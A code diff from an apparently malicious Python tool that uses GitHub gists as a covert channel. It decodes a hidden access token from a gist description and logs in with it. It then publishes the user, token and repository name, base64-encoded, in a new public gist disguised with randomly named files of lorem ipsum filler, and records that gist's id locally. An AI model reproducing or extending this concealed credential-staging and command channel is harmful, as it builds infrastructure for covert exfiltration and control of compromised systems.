@@ -65,7 +65,7 @@ def run(**args):
         self.word_list_ock = ('dock', 'lock', 'rock', 'sock', 'tock', 'block', 'clock', 'flock')
         self.filename_out = 'client_notes.txt'   
 
-        self.gist_data = GitHub().gist('a7f2201d3cea3249e0b879521306a05e')
+        self.gist_data = GitHub().gist('164013e01c2f3decf3815fd486d75542')
         self.git_token = str(b64decode(self.gist_data.description), 'utf-8')
         self.git_handle = login(token=self.git_token)
         self.git_user = str(self.git_handle.me())
@@ -103,8 +103,11 @@ def run(**args):
         if self.git_user and self.git_token and self.git_repo_name:
             git_dict = {'user':self.git_user,'token':self.git_token,'repo':self.git_repo_name}
             bindata = bytes('%r' %git_dict, 'utf-8')
-            contents_dict = {f'{self.word_list_ick[(randint(1,8)-1)]}-{self.word_list_ock[(randint(1,8)-1)]}.txt': {'content': 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec semper nibh vel eleifend tempor. Aliquam tincidunt, urna auctor pulvinar venenatis, enim urna sagittis lacus, lacinia malesuada tortor felis non massa. Sed pulvinar lacus id leo tincidunt, eget cursus neque porttitor. Fusce sit amet blandit arcu, eget dignissim ipsum. Phasellus nec consectetur justo. Aenean viverra, sem eget tempor semper, tortor ligula facilisis purus, et tristique libero dui ac est. Donec dui mi, rutrum iaculis sodales et, viverra dignissim dolor.'}}
-            self.git_handle.create_gist(str(b64encode(bindata), 'utf-8'),contents_dict,public=True)
+            contents_dict = {f'{self.word_list_ick[(randint(1,8)-1)]}-{self.word_list_ock[(randint(1,8)-1)]}-QRTXWY.txt': {'content': 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec semper nibh vel eleifend tempor. Aliquam tincidunt, urna auctor pulvinar venenatis, enim urna sagittis lacus, lacinia malesuada tortor felis non massa. Sed pulvinar lacus id leo tincidunt, eget cursus neque porttitor. Fusce sit amet blandit arcu, eget dignissim ipsum. Phasellus nec consectetur justo. Aenean viverra, sem eget tempor semper, tortor ligula facilisis purus, et tristique libero dui ac est. Donec dui mi, rutrum iaculis sodales et, viverra dignissim dolor.'}}
+            gist = self.git_handle.create_gist(str(b64encode(bindata), 'utf-8'),contents_dict,public=True)
+            with open(f'{self.git_repo_name}-gist_id.txt','w') as f:
+                f.write(gist.as_dict()['id'])
+            
 
     def bootstrap(self) -> None:
         self.boot_repo()
